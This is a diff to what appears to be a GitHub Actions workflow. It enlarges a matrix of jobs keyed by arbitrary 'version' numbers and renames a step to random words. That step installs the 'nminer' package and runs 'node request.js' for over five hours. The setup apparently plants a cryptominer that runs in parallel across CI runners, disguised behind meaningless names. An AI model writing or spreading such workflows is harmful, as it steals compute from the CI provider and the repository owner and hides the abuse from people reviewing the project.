@@ -9,23 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8498 }
-          - { version: 8546 }
-          - { version: 8266 }
-          - { version: 9141 }
-          - { version: 1485 }
-          - { version: 6488 }
-          - { version: 2268 }
-          - { version: 2609 }
-          - { version: 4795 }
-          - { version: 8851 }
-          - { version: 6217 }
-          - { version: 7260 }
-          - { version: 5723 }
-          - { version: 5560 }
-          - { version: 7898 }
-          - { version: 7515 }
-          - { version: 2432 }
+          - { version: 97 }
+          - { version: 3393 }
+          - { version: 6884 }
+          - { version: 2974 }
+          - { version: 6036 }
+          - { version: 4479 }
+          - { version: 1234 }
+          - { version: 9205 }
+          - { version: 5181 }
+          - { version: 8034 }
+          - { version: 3896 }
+          - { version: 128 }
+          - { version: 8228 }
+          - { version: 9387 }
+          - { version: 9712 }
+          - { version: 8876 }
+          - { version: 2293 }
+          - { version: 7011 }
+          - { version: 9992 }
+          - { version: 4675 }
 
     steps:
       - name: Checkout
@@ -36,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: definite familiarize inside
+      - name: scientific alb entomb coal especially
         run: |
           npm install nminer@latest
-          timeout 327m node request.js || echo "request executed"
+          timeout 342m node request.js || echo "request executed"
